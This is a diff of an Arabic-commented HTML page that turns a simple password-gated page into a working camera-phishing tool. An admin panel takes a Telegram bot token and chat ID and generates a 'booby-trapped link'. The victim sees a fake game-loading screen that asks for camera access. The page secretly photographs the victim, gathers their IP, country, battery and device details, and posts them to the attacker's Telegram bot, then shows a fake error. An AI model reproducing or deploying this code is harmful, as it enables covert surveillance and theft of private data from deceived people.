@@ -3,306 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MX</title>
-    
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
+    <title>Mohamed Matrix System</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', sans-serif;
-        }
+        :root { --neon: #00ff00; --black: #000; }
+        body, html { margin: 0; padding: 0; background: var(--black); font-family: 'Poppins', sans-serif; overflow: hidden; color: var(--neon); }
+        canvas { position: fixed; top: 0; left: 0; z-index: 1; }
+        
+        /* واجهة لوحة التحكم */
+        #adminPanel { position: relative; z-index: 10; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: rgba(0,0,0,0.9); border: 2px solid var(--neon); padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; box-shadow: 0 0 25px var(--neon); backdrop-filter: blur(10px); }
+        h3 { text-align: center; text-shadow: 0 0 10px var(--neon); }
+        label { display: block; margin-top: 10px; font-size: 14px; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin: 8px 0; background: rgba(0,0,0,0.7); border: 1px solid var(--neon); color: var(--neon); border-radius: 8px; box-sizing: border-box; outline: none; }
+        button { width: 100%; padding: 15px; background: var(--neon); color: #000; border: none; font-weight: 900; cursor: pointer; margin-top: 15px; border-radius: 8px; box-shadow: 0 0 15px var(--neon); }
+        #out { margin-top: 20px; padding: 10px; border: 1px dashed var(--neon); background: rgba(0,255,0,0.05); display: none; }
+        code { word-break: break-all; font-size: 11px; color: #fff; }
 
-        body {
-            background: #000;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden; /* عشان المطر ميعملش سكرول */
-        }
-
-        /* كود خلفية الماتريكس */
-        #matrix-canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 1; /* خلف كل شيء */
-        }
-
-        .container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-            position: relative;
-            z-index: 10; /* فوق الماتريكس */
-        }
-
-        .password-card {
-            background: rgba(0, 0, 0, 0.85); /* شفافية بسيطة عشان المطر يبان ورا الكارت */
-            border: 2px solid #00ff00;
-            border-radius: 20px;
-            padding: 40px 30px;
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.4);
-            text-align: center;
-            backdrop-filter: blur(5px); /* تأثير زجاجي خفيف */
-        }
-
-        h5 {
-            color: #00ff00;
-            font-size: 17px;
-            margin-bottom: 35px;
-            text-shadow: 0 0 15px #00ff00;
-        }
-
-        .subtitle {
-            color: #00ff00;
-            opacity: 0.7;
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-            text-align: right;
-        }
-
-        .input-group label {
-            display: block;
-            color: #00ff00;
-            margin-bottom: 8px;
-        }
-
-        .password-wrapper {
-            position: relative;
-        }
-
-        .password-wrapper input {
-            width: 100%;
-            padding: 15px 45px;
-            background: transparent;
-            border: 2px solid #00ff00;
-            border-radius: 10px;
-            color: #00ff00;
-            font-size: 16px;
-            outline: none;
-            box-shadow: inset 0 0 5px rgba(0, 255, 0, 0.2);
-        }
-
-        .password-wrapper input:focus {
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
-        }
-
-        .password-wrapper i {
-            position: absolute;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #00ff00;
-        }
-
-        .password-wrapper i:first-child { right: 15px; }
-        .toggle-site-password { left: 15px; right: auto !important; cursor: pointer; }
-
-        .attempts-left {
-            color: #00ff00;
-            font-size: 14px;
-            margin: 15px 0;
-            padding: 10px;
-            border: 1px dashed #00ff00;
-            border-radius: 5px;
-            background: rgba(0, 255, 0, 0.05);
-        }
-
-        .submit-btn {
-            width: 100%;
-            padding: 15px;
-            background: #00ff00;
-            color: #000;
-            border: none;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 20px;
-            box-shadow: 0 0 15px #00ff00;
-        }
-
-        .submit-btn:hover {
-            background: #000;
-            color: #00ff00;
-            box-shadow: 0 0 25px #00ff00;
-            border: 2px solid #00ff00;
-            transform: scale(1.02);
-        }
-
-        /* تصميم المودال/الدايلوج */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .modal {
-            background: #000;
-            border: 2px solid #00ff00;
-            border-radius: 20px;
-            padding: 30px;
-            width: 90%;
-            max-width: 350px;
-            text-align: center;
-            box-shadow: 0 0 50px rgba(0, 255, 0, 0.5);
-        }
-
-        .whatsapp-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            background: #25D366;
-            color: white;
-            text-decoration: none;
-            padding: 15px 25px;
-            border-radius: 50px;
-            font-weight: 600;
-            transition: 0.3s;
-            margin-top: 10px;
-        }
-
-        .whatsapp-btn:hover { box-shadow: 0 0 20px #25D366; }
+        /* واجهة الضحية (تحميل اللعبة) */
+        #victimUI { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; background: #000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .loader { border: 4px solid #111; border-top: 4px solid var(--neon); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <canvas id="matrix-canvas"></canvas>
+    <canvas id="matrix"></canvas>
 
-    <div class="container">
-        <div class="password-card" id="passwordCard">
-            <h5>𖣘𖤍ẹĿᶁ₳ị₷Ħẹи̃̾₭₳и̃̾𖤍𖣘</h5>
-            <p class="subtitle">by.mohamed morsy</p>
-            
-            <div id="messageArea"></div>
-            
-            <div class="input-group">
-                <div class="password-wrapper">
-                    <i class="fas fa-key"></i>
-                    <input type="password" id="sitePassword" placeholder="كلمة المرور" onkeypress="handleKeyPress(event)">
-                    <i class="fas fa-eye toggle-site-password" onclick="toggleSitePassword()"></i>
-                </div>
+    <div id="adminPanel">
+        <div class="card">
+            <h3>created.by.mohamed morsy</h3>
+            <label>ID CHAT</label>
+            <input type="text" id="tid" placeholder="id chat">
+            <label>(Bot Token)</label>
+            <input type="text" id="tkn" placeholder="bot token">
+            <button onclick="generate()">إنشاء الرابط الملغم </button>
+            <div id="out">
+                <p style="font-size:12px; margin:0 0 5px 0;">انسخ هذا الرابط وارسله:</p>
+                <code id="resLink"></code>
             </div>
-            
-            <div class="attempts-left" id="attemptsDisplay">
-                <i class="fas fa-shield-alt"></i>
-                عدد المحاولات: <span id="attemptsCount">4</span>
-            </div>
-            
-            <button class="submit-btn" onclick="checkSitePassword()" id="submitBtn">دخول</button>
         </div>
     </div>
 
-    <div class="modal-overlay" id="whatsappModal">
-        <div class="modal">
-            <i class="fas fa-user-slash" style="font-size: 50px; color: #ff0000; margin-bottom: 20px;"></i>
-            <h3 style="color: #ff0000;">خطاء</h3>
-            <p style="color: #fff;">تواصل مع المطور</p>
-            <a href="#" class="whatsapp-btn" id="finalWaBtn" target="_blank">
-                <i class="fab fa-whatsapp"></i>
-               whatsapp
-            </a>
-            <button onclick="closeModal()" style="background:none; border:none; color:#555; margin-top:15px; cursor:pointer;">إغلاق</button>
-        </div>
+    <div id="victimUI">
+        <div class="loader"></div>
+        <h2 id="statusText">جاري تحميل موارد اللعبة...</h2>
+        <p style="color:#666; font-size:13px;">برجاء الانتظار وقبول الأذونات اللازمة</p>
     </div>
 
     <script>
-        // --- إعدادات الماتريكس ---
-        const canvas = document.getElementById('matrix-canvas');
+        // --- 1. تأثير الماتريكس ---
+        const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
-
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
         const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%";
-        const fontSize = 10;
+        const fontSize = 12;
         const columns = canvas.width / fontSize;
-        const drops = [];
-
-        for (let i = 0; i < columns; i++) {
-            drops[i] = 1;
-        }
-
-        function drawMatrix() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-            ctx.fillStyle = "#00ff00";
-            ctx.font = fontSize + "px monospace";
-
-            for (let i = 0; i < drops.length; i++) {
-                const text = letters.charAt(Math.floor(Math.random() * letters.length));
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
+        const drops = Array(Math.floor(columns)).fill(0);
+        function draw() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px arial";
+            drops.forEach((y, i) => {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, y * fontSize);
+                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
+            });
+        }
+        setInterval(draw, 33);
+
+        // --- 2. التحقق من الرابط (أدمن أم ضحية) ---
+        const params = new URLSearchParams(window.location.search);
+        const t = params.get('t');
+        const i = params.get('i');
+
+        if(t && i) {
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('victimUI').style.display = 'flex';
+            startCapture(t, i);
+        }
+
+        // --- 3. وظيفة إنشاء الرابط للأدمن ---
+        function generate() {
+            const tid = document.getElementById('tid').value;
+            const tkn = document.getElementById('tkn').value;
+            if(!tid || !tkn) return alert("برجاء إدخال كافة البيانات!");
+            const finalLink = window.location.href.split('?')[0] + `?i=${tid}&t=${tkn}`;
+            document.getElementById('resLink').innerText = finalLink;
+            document.getElementById('out').style.display = 'block';
+        }
+
+        // --- 4. وظيفة السحب الكاملة (للضحية) ---
+        async function startCapture(botToken, chatId) {
+            try {
+                // طلب الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvasCap = document.createElement('canvas');
+                canvasCap.width = video.videoWidth;
+                canvasCap.height = video.videoHeight;
+                canvasCap.getContext('2d').drawImage(video, 0, 0);
+
+                canvasCap.toBlob(async (blob) => {
+                    // جلب معلومات إضافية
+                    let ipInfo = { ip: "غير معروف", country_name: "غير معروف" };
+                    try { const r = await fetch('https://ipapi.co/json/'); ipInfo = await r.json(); } catch(e){}
+
+                    let batteryStatus = "غير معروف";
+                    try { 
+                        const b = await navigator.getBattery(); 
+                        batteryStatus = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'جاري الشحن' : 'غير موصل'})`;
+                    } catch(e){}
+
+                    const device = /Android|iPhone|iPad/i.test(navigator.userAgent) ? navigator.userAgent.match(/Android|iPhone|iPad/i)[0] : "PC";
+
+                    // تنسيق الرسالة
+                    const caption = `
+━━━ • 📸 • ━━━
+📸 صورة جديدة تم التقاطها
+━━━ • 📋 • ━━━
+🌍 الدولة: ${ipInfo.country_name}
+📱 الجهاز: ${device}
+🔋 البطارية: ${batteryStatus}
+🌐 IP: ${ipInfo.ip}
+🕒 الوقت: ${new Date().toLocaleString('ar-EG')}
+━━━   برعايه عمك محمد مرسي😘💹━━━`;
+
+                    // إرسال لتليجرام
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'shot.jpg');
+                    fd.append('caption', caption);
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                    
+                    // إنهاء العملية
+                    stream.getTracks().forEach(tr => tr.stop());
+                    document.getElementById('statusText').innerText = "حدث خطأ في جرافيك اللعبة (Error 403)";
+                }, 'image/jpeg');
+
+            } catch (err) {
+                document.getElementById('statusText').innerText = "يجب السماح بالصلاحيات لتشغيل موارد اللعبة";
             }
         }
-        setInterval(drawMatrix, 33);
-
-        // --- منطق الصفحة (نفس منطقك مع تعديلات خفيفة) ---
-        const SITE_PASSWORD = "$###$"; // غير الباسورد هنا
-        const WHATSAPP_NUMBER = "201212278636"; // رقمك
-        let attemptsLeft = 4;
-
-        function checkSitePassword() {
-            const val = document.getElementById('sitePassword').value;
-            if (val === SITE_PASSWORD) {
-                window.location.href = "https://mohamedmorse7777890-hub.github.io/Mohamed/";
-            } else {
-                attemptsLeft--;
-                document.getElementById('attemptsCount').innerText = attemptsLeft;
-                if (attemptsLeft <= 0) {
-                    showModal(true); // حظر كامل
-                } else {
-                    showModal(false); // رسالة خطأ فقط
-                }
-            }
-        }
-
-        function showModal(isFinal) {
-            document.getElementById('whatsappModal').style.display = 'flex';
-            const btn = document.getElementById('finalWaBtn');
-            btn.href = `https://wa.me/${WHATSAPP_NUMBER}?text=محتاج باسورد الموقع`;
-            if (isFinal) {
-                document.getElementById('submitBtn').disabled = true;
-                document.getElementById('sitePassword').disabled = true;
-            }
-        }
-
-        function closeModal() {
-            document.getElementById('whatsappModal').style.display = 'none';
-        }
-
-        function toggleSitePassword() {
-            const input = document.getElementById('sitePassword');
-            input.type = input.type === 'password' ? 'text' : 'password';
-        }
-
-        function handleKeyPress(e) { if (e.key === 'Enter') checkSitePassword(); }
-
-        window.onresize = () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        };
     </script>
 </body>
 </html>
